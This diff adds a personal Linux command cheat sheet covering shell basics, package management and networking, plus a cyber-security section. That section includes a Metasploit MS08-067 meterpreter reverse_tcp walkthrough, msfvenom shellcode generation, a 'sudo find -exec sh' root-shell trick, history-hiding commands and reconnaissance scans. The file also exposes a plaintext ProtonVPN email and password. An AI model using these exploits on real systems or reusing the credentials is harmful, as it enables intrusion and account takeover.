@@ -1,0 +1,832 @@
+
+TextSyntax
+<> Master title
+> Sub title
+// comment
+[]  Generic keyword, EG username
+{} Insertion space, above there will be an indication of what values to insert into the brackets	 	 
+
+Linux kernel
+
+Argument passing>
+	In the linux kernel one word arguments are passed with -, multiple single letter arguments can be chained
+	A word argument needs a -- prefix
+	//BSD syntax uses no dashes before a parameter
+Shortcuts>
+	Up Arrow – Show the previous command
+	Ctrl + R – Allows you to type a part of the command you're looking for and finds it
+	Ctrl + Z – Stops the current command, resume with fg in the foreground or bg in the background
+	Ctrl + C – Halts the current command, cancel the current operation and/or start with a fresh new line
+	Ctrl + L – Clear the screen
+	command | less – Allows the scrolling of the bash command window using Shift + Up Arrow and Shift + Down Arrow
+	!! – Repeats the last command
+	command  !$ – Repeats the last argument of the previous command
+	Esc + . (a period) – Insert the last argument of the previous command on the fly, which enables you to edit it before executing the command
+	Ctrl + A – Return to the start of the command you're typing
+	Ctrl + E – Go to the end of the command you're typing
+	Ctrl + U – Cut everything before the cursor to a special clipboard, erases the whole line
+	Ctrl + K – Cut everything after the cursor to a special clipboard
+	Ctrl + Y – Paste from the special clipboard that Ctrl + U and Ctrl + K save their data to
+	Ctrl + T – Swap the two characters before the cursor (you can actually use this to transport a character from the left to the right, try it!)
+	Ctrl + W – Delete the word / argument left of the cursor in the current line
+	Ctrl + D – Log out of current session, similar to exit
+
+Operators>
+	//Combine commands with pipe
+		[commandOne] | [commandTwo]
+		//Redirect output to a file, >: overwrite target entirely or create file, >>: Append output to file or create file
+	//Use wildcard to auto fill things
+		cat fileNa*
+	//Use "" to use something in that exact way
+		//EG to find an exact word
+			find -name "exactFileName"
+Others>
+	Unknown>
+		readlink -f /proc/{PID of process}/exe
+	Command combinations>
+		Setup custom executable>
+			//Give executable permissions
+				chmod 755 ./clean_pdf
+			//Move to path, so script can be directly run from the command line anywhere on the filesystem
+				mv ./clean_pdf /usr/bin/clean_pdf
+Local info gathering>
+		System info>
+			List hardware>
+				//gpu drivers
+					lshw -numeric -C display
+				//CPU
+					cat /proc/cpuinfo
+				//Memory
+					//All
+						cat /proc/meminfo
+					//Memory and swap useage
+						free
+				//Disk useage
+					df -h
+				//Directory space useage
+					du
+
+
+			//Get kernel version
+				uname -a
+			//OS version
+				lsb_release
+		Time>
+			data
+			cal
+			uptime
+			
+Utility>
+	Basics>
+		Path>
+			//Run something in the current folder
+			./programname
+			//Run via path starting from the root folder 
+			/directory/programname
+		Line formatting>
+			//Run two commands on a line
+				echo "Hello"; echo "World"
+			//Write a command on two lines
+				echo "Hello "\
+			"World"	
+	Scripting>
+		//Create a text file and enter ->
+		#! /bin/bash
+		echo "This is my first bash script..."
+		cd ~/Desktop
+		ls -halt
+		touch somefile
+		ls -halt
+		echo "Pretty cool, right?"
+		//Make that text file an executable ->
+		chmod +x myscript.sh
+		//Run script
+		./myscript.sh
+	Compression>
+		tar>
+			//Extract -> create
+				//Normal
+					tar cf file.tar [files] 
+					tar xf file.tar 
+				//Gzip
+					tar czf file.tar.gz [files]
+					tar xzf file.tar.gz
+				//Bzip2
+					tar cjf file.tar.bz2 [files]
+					tar xjf file.tar.bz2 – Extract a tar using Bzip2
+		zip>
+			//Compresses file and renames it to file.gz
+				gzip file
+			//Decompresses file.gz back to file
+				gzip -d file.gz 
+	Print>
+		//Print demon
+			/etc/rc.d/init.d/lpd start 
+			/etc/rc.d/init.d/lpd stop
+			/etc/rc.d/init.d/lpd status
+		//Print queue
+			//Display jobs in queue
+				lpq
+			//Remove jobs from queue	
+				lprm
+		//Print a file
+			lpr
+		//Printer control tool
+			lpc
+		//Manual
+			//Print as plain text
+				man [subject] | lpr 
+			//Print as Postscript output
+				man -t [subject] | lpr 
+		//Start X printer setup interface
+			printtool
+	Network>
+		//List ip adddresses
+			ifconfig
+		//Set the params of the network interface which are specific to the wireless operation
+			iwconfig
+		//Display additional info from a wireless network interface that is not displayed by iwconfig
+			iwlist 
+		
+
+	General>
+		//Convert file to pdf
+			ps2pdf
+		//Time command
+			time []
+
+
+		
+		
+System>
+	Edit machine state>
+		shutdown
+		//Similar parameters in windows and linux, prefix with / in windows and - in linux
+		//-r: Restart, -t: Time to process, [number]: time to process, now:,  
+			shutdown {} {}
+		reboot
+		//Start the X system
+			startx
+		
+		
+Directories and files>
+	List file directories>
+		ls
+			//-l: Long form list of folders, -t: Sort by modification time, -a: Hidden files, -alt: Combination of previosu commands
+			ls {}
+			//Specific file/folder/path
+			ls [filePath]
+		//List working directory
+			pwd
+	Change directories>
+		cd
+			//Back one
+				cd ..
+			//Forward one
+				cd .
+			//Go to home directory
+				cd ~
+			//Go to specific location
+				cd /home/agent/Desktop
+	Edit file contents>
+		
+		Text editor>
+		//Either will create file if it doesnt exist
+			nano
+				nano [filePath]
+			vim
+				//More powerful CLI text editor
+					vim [filePath]
+				//use i for insert/interactive mode and CTRL C to exit
+				// :q quit with saved changes, :q! quit while you have unsaved changes, :wq or :x save and quit
+				
+	Create file>
+		//Note for any commands to effect hidden files add a . before the file name
+		//Create a file with text, can use that operator to output anything to a file
+			echo "[text]" > [newFilePath]
+		//Check if a file exists, if it doesnt create it
+			touch [filename]	
+		
+	Edit directories and files>
+		move>
+			//blank: no parameters, -n: Dont overwrite, -u: overwrite if timestamp is newer 
+				mv {} [filePath] [targetFilePath]
+			//Rename file
+				mv [filePath] [filePathEndingInADifferentName]
+		Copy>
+			//blank: no parameters, -r or -R: use recursive parameter to copy directories (and contents)
+				cp {} [filePath] [filePath]	
+		Remove> 
+			//blank: no parameters, -r: recursive, allows to remove folders
+				rm {} [filePath]
+		Make directory>
+			mkdir [directoryPath]
+			//Make multiple directories
+				mkdir -p [folderName]/[subFolderName]/[subFolder2Name]
+			//Set permissions
+				mkdir -m 777 dirname
+		//Sync two folders
+			//
+			 //-e: Execute commands, exploitable by wildcard injection 
+				Rsync {} [firstFolder] [secondFolder] {}
+				
+				
+	Display contents of a location>
+		Chnage amount of contents displayed
+		//Gradually load program into memory
+			less [filePath]	
+		//Output first twenty characters	
+			head -20 [file] 
+		//Output last 20
+			tail -20 [file]
+		//Output contents of file as it grows starting from last ten lines
+			tail -f file
+			
+		cat>
+			//Print text file contents to console
+				cat filename
+			//Join two files
+				cat filename1 filename2
+			//Redirect file output
+				//Overwrite it
+					cat filename1 filename2 > new_file
+				//Append to it	
+					cat filename1 filename2 >> appended_file
+			//Use wildcard operator, match any files: *, match all txt files: *.txt, match files starting with pass: pass*
+				cat {}
+		strings>
+			//Get all strings in a file
+				strings [filePath]		
+	Search files>
+		grep>
+			grep [searchquery] [filename]
+			grep Ethan usernames.txt
+			//Operators
+				//Add the pipe operator, this changes the output of one command to anouther
+				//Search for a filename
+					ls | grep [filename]
+				//Ignore case: -i and recursive search: -r
+					grep {} "bob" filename
+			//Print a files contents and filter to a certain number of lines around target string
+				cat securityEventFile | grep -a[numberOfLines] [targetString]
+			
+				
+		find>
+			//-name:, can use wildcards in file name EG "*myfile*"
+			find [searchDirectory] {searchMethod} [searchQuery]
+			//Search entire filesystem for files called passwords
+				find / -name "passwords"
+			//Redirect errors to a certain file 
+				find / -name "passwords" 2> /dev/null
+			//find files in the last 30 days: -mtime: -30, find files > 10 MB in size: -size +10M, find files that start with media then have some letters with a .exe extension: -name media*.exe
+			//-perm -[permissionsValuable], -user [user]
+				find [path] {} {}cd home
+				
+				
+		whereis>
+			//Find all the locations of a program
+				whereis gimp
+	
+	
+Help>
+	man>
+		//Get help with ls command
+			man ls
+		//Search man pages for key words, use "" to make sure its isolated
+			apropos ["keyword"]	
+	//-h, --help 		
+		[binName] {}		
+			
+Permissions>
+	Superuser permissions>
+		//Swap to root user
+			su root
+			sudo su
+			sudo bash
+		//Use sudo to enter admin PW for temporay root privillages, note when piping commands sudo may needed to be prefixed for both commands
+			sudo [command]
+		//Get a root shell with sudo
+			sudo find /etc -exec sh -i \;
+	chmod>
+		//Edit a programs permissions, +x: Give execute permissions, -x: Take	 execute permissions, +w: Give write permissions	
+		//or 
+		//set all permissions: 755 (Each number repersents 1 of user/user group/others; Think of the number as binary for there effect, 111 = 7 so means +rwx, or Read = 4 Write = 2 Execute = 1 then add)
+			chmod {} [filePath]
+	whoami>
+		//Get current user
+	chown>
+		//Change ownership of a file, EG
+		sudo chown root:root ./demo
+	stat>
+		//Get the owner of a file
+		stat -c %U file
+	//Create new user
+		adduser [accountname] 
+	//Give account a new password
+		passwd [accountname] 
+	
+	
+Processes>
+	//See running processes using the most resources
+		top	
+	//List running processes
+		ps auxf
+		ps auxf | less
+		ps aux | grep [processName]
+		ps aux | grep bash | grep -v grep	
+	//Print current user running processes, See more info: -u, See all processes (not only for your user): -ax
+		ps {}
+	//See status of all services
+		service --status-all
+	//Get PID
+		pgrep
+	//Kill process: -9: kill 
+		kill -{signal} [PID]	
+	//Use pipe operator to: scroll through, find stuff, find stuff and ignore grep process
+		ps auxf | less
+		ps aux | grep [processName]
+		ps aux | grep bash | grep -v grep
+	//Add space to run new jobs
+		//Send paused task to the background
+			bg
+		//Bring paused task back to the foreground
+			fg
+	//Stop all running processes
+		halt
+	cron table>
+		//Schedule commands to run at regular time intervals
+		//Open crontab to edit tasks
+			crontab -u [user]  [filePath]
+		//Can edit /tmp/crontab
+			minute(0-59) hour(0-23) day(1-31) month(1-12) weekday(0-6) command
+		//EG
+			0,14,29,44 * * * * /usr/bin/example2
+			runs /usr/bin/example2 at the 15-minute mark on every hour, every day. Make sure you add each new task on a new line.
+	//Find out what files the process is using
+		lsof -p [processID]
+	//Get all programs connecting to port 80
+		lsof -i tcp:80 -P -R
+		
+History>
+	//Show history
+		history	
+	//Delete history
+		history -c
+	//For a reverse-command-search use CTRL + R, then type in part of a previous command, CTRL + R again to go further back
+	
+	//Hide commands
+		//Prefix each command with a 'space'
+		//or
+			set +o history
+	
+Environment variables>
+	//Data is ephemeral (disapears when you close the terminal window)
+		//Print a EV. /home/user
+			echo $HOME
+		//Change the value of a EV temporarily
+			export HOME=/tmp
+		//Get all EV
+			printenv
+		PATH> 
+			//Get the path of EV
+			which [EV name]
+			//When you open a bash shell it runs the script .bashrc, so you can add an export statement here to set PATH permanently
+			export PATH=$PATH:/mycustomfolder
+
+Network>
+	Netcat>
+		//Listen on a port
+			nc -l 1337
+		//Connect to a port
+			nc 192.168.33.2 1337
+		//Transfer files
+			//Listen on port and send any output recevied content to myfile
+				nc -l 1337 > myfile
+			//Connect to computer and send the content of myfile
+			
+			nc 192.168.33.2 1337 < myfile
+	SSH>
+		//  /etc/passwd /etc/shadow /etc/passwd.
+		//Connect
+			//Connect to secure file server with credentials, add a custom port (otherwise 22 is used): -p
+				ssh username@domain.com {}
+			//If a keyfile is needed instead of a separate password
+					ssh -i /path/to/keyfile username@ipaddress
+		//Copy local file to remote server
+			scp file.txt username@domain.com:/folder/file.txt
+		//Copy remote file to local PC 
+			scp username@domain.com:/folder/file.txt file.txt
+		//Close connection
+			exit
+	curl>
+		//Perform HTTPS tasks
+			curl https://example.com/index.php --data "username=luffy&loggedin=true"			
+	wget>
+		//Blank: Download webpages, -c: Continue stopped download
+			wget {} [url/file]
+			
+	netstat>
+		//Check listening ports
+			netstat -pultn
+		//Check tcp ports including those only avaliable to root
+			sudo netstat -antlp
+		//	
+			sudo netstat -A inet -p
+	//Get info on domain
+		whois domain
+		//DNS info
+			dig [domain]
+		//Reverse lookup host
+			dig -x host 	
+Packages>		
+	Package manager>
+		apt-get>
+		//Debian package manager, apt or apt-get
+			//Update sources (servers with package info/download links)
+				sudo apt update
+			//Update installed software
+				sudo apt upgrade
+			//Download/remove software
+				sudo apt install [packageName]
+				sudo apt remove [packageName]
+			//Get info on a package
+				aptitude show [packageName]
+			//Search for a package
+				sudo apt search [packageName]
+			
+		yum>
+			//Fedora package manager
+				//Automatically updates sources	
+				//Upgrade isntalled software, blank: Update all software, [packageName]
+					sudo yum update {}
+				//Download/remove software
+					sudo yum install [packageName]
+					sudo yum remove [packageName]		
+	Packaged software>
+		dpkg>
+				// .deb files are packages generated for Debian-based distros, install with dpkg
+				// Install debian package
+					sudo dpkg -i /home/user/cowsay.deb
+				//Remove
+					sudo dpkg -r cowsay
+				//List packages installed
+					dpks -l
+			rpm>
+				//Generated for Fedora-based distros
+				//Install
+					rpm -Uvh /home/user/cowsay.rpm
+				//Remove
+					rpm -e cowsay
+				//List packages
+					rpm -qa
+	Building from source>
+				//Look for INSTALL txt file
+				//cd into direcotry with source code -> run configure ELF (executable) file to generate system specific makefile ->  run make to compile source code into an ELF -> 
+				 // run sudo make install to move binary created and required files to system folders (now they can be used anywhere)	
+					cd [pathToSourceCode]
+					make [sourceCode]
+					make install 
+	
+<Scripting languages>
+	python>
+		//run program
+			python [fileName.py]	
+	C>
+		//It 32 bit compling doesnt work, some possible packages
+			sudo apt-get install libc6-dev
+			sudo apt-get install gcc-multilib
+			sudo apt-get install libc6-dev:i386
+		
+		//Run a C program via compling it into an ELF
+			gcc -o hello hello.c
+		//Specify processor arcitechure
+			gcc -m32 -o hello hello.c
+		//Use MinGW cross-complier to compile for windows
+
+Domestic Security tools>
+	ClamAV>
+		clamscan -r -i [pathToScan]
+	rkhunter>
+		//--check: Check the local system for rootkits
+		rkhunter {}
+	chkrootkit>
+		chkrootkit
+	
+General applications>
+	Linux mint firewall>
+		sudo ufw reject in from 173.194.55.0/24
+		sudo ufw reject in from 206.111.0.0/16
+		sudo ufw status verbose
+	postgresql
+		//other
+			https://www.postgresql.org/docs/9.6/auth-pg-hba-conf.html
+			/etc/postgresql/10/main/
+		//setup
+			sudo apt install postgresql		
+			//Only postgres user can run psql
+				//Change password
+					sudo -u postgres psql postgres
+					\password postgres
+				//or
+					sudo passwd postgres
+		su postgres
+		//List DB
+			psql -l	
+		//Drop to psql shell
+			psql postgres
+		//Create DB
+			createdb linuxhint
+		//modify the pg_hba.conf to add authentication for new database
+		//Reload config files
+		 	service postgresql reload
+		 
+		
+		
+	proton vpn>
+		sudo protonvpn-cli -init
+		//or
+		sudo pvpn -init
+		//Login
+			emerald1475@protonmail.com
+			protonEmerald9903
+		//Connect
+			sudo protonvpn-cli -connect
+			protonvpn-cli -c [server-name] [protocol]
+			protonvpn-cli -r, --random-connect
+			protonvpn-cli -l, --last-connect
+			protonvpn-cli -f, --fastest-connect
+			
+		//Dialog
+			sudo protonvpn-cli -m
+		protonvpn-cli --reconnect
+		sudo protonvpn-cli -disconnect
+		
+		protonvpn-cli --ip
+		
+
+Cyber security Security>
+	Start up items>
+		runlevels>
+			//specifies which mode the OS is running under
+			//0: shutdown, 1: single-user mode (kind of like safe mode), 2 through 5: multi-user / normal modes
+			//6: reboot
+			//See current run level
+				runlevel
+			//See software configured to run at level 5 (their symlinks/shortcuts)
+			ls /etc/rc5.d/
+			//Some distro's location to store software that starts at boot
+			/etc/rc.local
+		systemd>
+			//Method to run software at boot
+			//Check services
+				systemctl
+			//Most of them are located in
+				/lib/systemd/system/*.service
+				/etc/systemd/system/*.service
+			//Stop systemctl service
+				sudo systemctl disable postgresql
+		crontab>
+			//List crontab
+			crontab -l
+			//Edit crontab
+			crontab -e
+			//Get crontabs for a certain user
+			crontab -u [user]  [filePath]
+			
+	Analyse/sniff network packets>
+		tcpdump>
+			tcpdump -i eth0 - investigate what is being transmitted to the interface you specify
+			//Capture packets
+				//host [hostIP]:, src [sourceIP]:, dst [trafficDestinationIp], net [IP/Subnet]: packets going to/from a particular network/subnet
+				//port [portNumber], icmp: target specific protocols
+				tcpdump {}
+				tcpdump -c 1 -X icmp: capture packet contents with Hex output
+				
+		
+	Reconisance>
+		meta data> 
+			farming>
+				Manual>
+					cd ~/Downloads
+					wget https://www.sans.org/training/mgt512/paag.xls
+					//Find meta data, look for creator and other info
+						apt install exiftool
+						exiftool paag.xls
+				Automated>
+					metagoofil>
+					//Use google to search for files on a certain domain
+					//Install
+						apt install metagoofil
+						pip install requests 
+						rm -rf /usr/share/metagoofil/  
+						git clone https://github.com/WiReD-/metagoofil.git /usr/share/metagoofil
+					//Run it, -d: domain, -t: kind of files, -l: max number of google search results to look back, -o: target to download files to, -f: name of output file where results are saved
+						metagoofil {} {} {} {}
+						//EG
+							metagoofil -d sans.org -t doc,pdf,xls -l 200 -o sans_files -f sans_results.html
+			removing>
+				//Extract metadata from your PDF files
+				//Display metadata
+					exiftool OrganizationsCoreAssignment.pdf	
+				//Install tools
+					apt install pdftk
+					apt install qpdf
+				//Remove metadata
+					exiftool -all:all= OrganizationsCoreAssignment.pdf
+				//Use a bash script that will make it harder to copy data and run on file
+					
+	Crack passwords>
+		Wordlists & CeWL>
+		//After intercepting PW hashes going over a network
+		//Crawl a site and pull out common words
+			//Install
+				apt install cewl
+			//Run
+				//-v: Verbose (more info), -d: Max link depth to crawl through, -w: outputFile
+					cewl {} {} {} [targetSite]
+				//EG
+					cewl -v -d 1 -w words.txt https://www.sans.org
+	DNS> 
+		//Get info on a domain name
+			whois sans.org
+		Zone transfer>
+			host -l [domainName] [vunerableNameServerIP]
+		enumerate DNS records using a wordlist>
+			//Guess valid sub domains, blank: Use default worldist, -W [wordListName]: 3rd party wordList, can use Kali Linux /usr/share wordlists
+				dnsmap [domainName] {}	
+				
+	Find hidden directories in a website>
+		//Armed with a list of websites, you could start to find directories that are not linked directly in the public areas of the site.
+		//Use a wordList to craft HTTP requests
+			dirb http://myfakedomain.local /usr/share/wordlists/dirb/small.txt	
+			
+	Port scan>
+		with netcat>
+			nc -z -v -w 1 192.168.0.92 1-1338 | grep "succeeded!"
+		Nmap>
+			//Aim to find ports which have a vulnerable service listening
+			//Scan for open ports
+					//-vv: 2nd level of verbosity (print Nmaps actions),  -p-: Scan all ports (rather than just a 1000)
+					 //-sT: TCP connect scan (dont need root permissions, obvious scan that firewalls/IDS systems will flag)
+					 //-sS: syn scan, normal tcp on open ports: Syn -> Syn-Ack -> Ack, syn scan: Syn -> Syn-Ack, closed ports: Syn -> Rst 
+					 //-sV: Connect to ports and check running service
+					 //-sU: UDP scans, though because UDP is connection-less, they take longer time and are inaccurate.
+					 // -O: Fingerprint OS 
+					  //-p-: Scan all ports (rather than just a 1000)
+						nmap {} {} {} [targetIP]
+						
+				//Because UDP is connection-less, UDP scans can take a long time and aren't necessarily accurate.
+					//UDP scan
+						nmap -vv -sU -p- 127.0.0.1	
+	Exploitation>
+		Custom binary exploits>
+			//Aliases: run: r, break: b, continue: c, Quit: q
+			//Get functions
+					info functions
+			//Disable a function
+				disas [functionName]
+			Break points>
+				//You can pause a programs execution by settings a break point
+					break *[functionName]
+					break *[functionMemoryAddress]	
+				//After a break
+					continue
+					//Continue moving through the program and step into call instructions (you have to go through that function isntruction by instruction) (can be useful to call custom functions but a pain for standard ones)
+						step
+					//or continue but step over function calls
+						next
+					quit
+			Inspect memory>
+
+					//i: View instruction normally, x: View as hex, s: view as string
+					 //[instructionMemoryAddress], [memory registers]
+
+						x/[numberOfRepetitions]{} {}
+					//EG 
+					
+						x/i 0x565555a1
+						//Print 20 esp hex enteries
+						x/20x $esp		
+		Existing exploits>
+			Metasploit>
+				msfconsole		
+				db_status
+				msf prompt>
+					/Find an exploit in Metasploit's DB, EG windows XP exploit
+					search ms08-067
+					use exploit/windows/smb/ms08_067_netapi
+					//Setup payload
+						//List payloads
+							search payload
+						set PAYLOAD windows/meterpreter/reverse_tcp
+					//Set options
+						options
+						//Set technique, EG powershell scripts
+							set TECHNIQUE PSH
+						//Set target remote host
+							set RHOST 192.168.182.154
+						//Set the localhost	
+							set LHOST 192.168.182.138
+					
+					exploit
+					Examine system>
+						//Get system info
+							getuid
+						//Get current permissions
+							run post/windows/gather/win_privs
+						//Get system privalleges
+							getsystem
+					screenshot
+				
+				Generate shellcode>
+					//-a: architecture (x86 for 32 bit), -p: payload (EG bind to a port and wait for you to connect), --platform,
+					// -b: bad characters (0X00 is a null byte, 0x0d is a carriage return, 0x0a is a newline character, any of these could cut of the input), -f: output format, [targetPort]: Dont use the target port if you just want to test the shellcode or exploit 
+					msfvenom {} [] {} [] {} []
+					//EG creating a listener
+					msfvenom -a x86 -p windows/shell_bind_tcp --platform windows -b \x00\x0a\x0d -f python LPORT=4444
+					
+	<Foresensics>		
+		Cryptography>
+			Stegnography>
+				Steghide>					
+					//Display information about a cover or stego file.
+						steghide info --info
+					//embed, extract
+						 //Embed file with msg: -ef, --embedfile, specify cover of file used to embed data: -cf, --coverfile, 
+						 //specify stego file: -sf, --stegofile, create file and write extracted embedded data to it: -xf, --extractfile 
+						steghide {} {} [filename]
+						//EG steghide extract -sf [fileName] -xf --flag.txt		
+				Search manually>
+					//Zoom in on the image to see if small things visually hidden
+					//Check file headers
+						file [fileName]
+						//or use hexedit to read hex headers
+						
+					//Read strings	
+						strings [fileName]
+					//Check with steghide if you have a PW
+					 steghide {} [fileName]
+					 //Mine meta data
+					 exiftool -k [fileName]		
+						
+		Disk Forensics and the File System>		
+			//Different file-storage types: EG FAT (12/16/32), NTFS, HFS, ext2/3/4, UNIX
+			Memory forensics>
+			//Methods: investigating metadata, listing protocols and ports used and keyword searching.
+			//Volatility 
+				//Tool for memory forensics, extract a .pst file out of memory for outlook info and then use a tool to browse them EG pffexport
+				//Find OS related to extracted .mem file 
+					volatility -f [filename] imageinfo 
+				//high-level view of running processes: pslist, Scans memory for EPROCESS blocks: psscan, Display parent-process relationships: pstree, 
+				//Scan memory for FILE_OBJECT handles: filescan, Extract FILE_OBJECTS from memory: dumpfiles	
+					volatility -f [filename] –profile=[Profile abtained from imageinfo] {}
+	
+		Event Logs and Log Files>
+			//Extra data and save
+			evtx_dump.py [fileName.evtx] > eventFile
+			//Sort and group data
+				//target EG RDP and 4624
+				cat securityEventFile | grep -a10 [target]
+				//Optional params head: Reduce amount of data, awk: Get a column
+				cat eventFile | grep [targetUserName] | sort | uniq -c | sort -nr | head -n5 | awk '{ print $1}'
+				
+				
+			Encryption>
+				Symmetric encryption>
+					//Encrypt file with DES, enter PW after command
+						openssl enc -des -in [plainText.txt] -out [encryptedFile.enc]
+					//Decrypt, enter PW after command
+						openssl enc -des -d -in [encryptedFile.enc] -out [plainText.txt]
+				Asymmetric encryption>
+					//Key parts: public and private parts, known as a keypair
+					//Generate keypair
+						openssl genrsa -out private.pem 2048
+					//Extract public key
+						openssl rsa -in private.pem -outform PEM -pubout -out public.pem
+					//Encrypt
+						openssl rsautl -encrypt -in [plainText.txt] -pubin -inkey public.pem -out [cipher.txt]
+					//Decrypt
+						openssl rsautl -decrypt -in [ciper.txt] -inkey private.pem -out [plainText.txt]
+					//AES
+						openssl aes-256-cbc -in attack-plan.txt -out message.enc
+						openssl aes-256-cbc -d -in message.enc -out plain-text.txt
+				Hashing>
+					//Pass text with	echo "" | 
+					//or with <<< 'Hello, World!'
+					sha1sum	
+					sha256sum
+					sha512sum
+					md5sum
+			Encoding>
+				base64> 
+					openssl enc -base64 <<< 'Hello, World!'
+					openssl enc -base64 -d <<< SGVsbG8sIFdvcmxkIQo=
+				Hex>
+					//Decimal to hex, swap bases for the other way around
+					echo "obase=16; ibase=10; 25" | bc
+					//Binary to hex
+					echo "obase=16; ibase=2; 1111" | bc
+
+					
+					
+
